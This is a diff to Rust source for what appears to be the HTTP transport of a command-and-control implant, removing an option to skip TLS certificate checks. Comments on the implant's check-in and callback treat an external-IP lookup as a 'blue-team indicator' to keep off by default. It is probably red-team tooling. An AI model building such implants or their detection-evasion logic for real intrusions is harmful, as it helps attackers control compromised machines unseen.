@@ -27,11 +27,6 @@ pub struct HttpProfile {
     pub proxy_port: String,
     pub proxy_user: String,
     pub query_path_name: String,
-    /// Compatibility field from the old ureq backend. The minreq backend uses
-    /// strict rustls/webpki verification and does not support disabling
-    /// certificate checks.
-    #[serde(default)]
-    pub insecure_skip_tls_verify: bool,
     /// When true, query icanhazip.com (over HTTPS) at check-in to populate
     /// the callback's external_ip field. Off by default — the egress is a
     /// strong blue-team indicator.
@@ -73,10 +68,6 @@ fn redact_url(url: &str) -> String {
 }
 
 impl HttpProfile {
-    pub fn insecure_skip_tls_verify(&self) -> bool {
-        self.insecure_skip_tls_verify
-    }
-
     pub fn external_ip_check(&self) -> bool {
         self.external_ip_check
     }
@@ -147,7 +138,6 @@ impl C2Transport for HttpProfile {
             Some(&self.headers),
             self.proxy_url().as_deref(),
             None,
-            self.insecure_skip_tls_verify(),
         )
         .map_err(|e| {
             if DEBUG.load(Ordering::Relaxed) {
@@ -172,7 +162,6 @@ impl C2Transport for HttpProfile {
             Some(&self.headers),
             self.proxy_url().as_deref(),
             None,
-            self.insecure_skip_tls_verify(),
         )
     }
 
@@ -190,7 +179,6 @@ impl C2Transport for HttpProfile {
             Some(&self.headers),
             self.proxy_url().as_deref(),
             Some(packed),
-            self.insecure_skip_tls_verify(),
         )
     }
 }
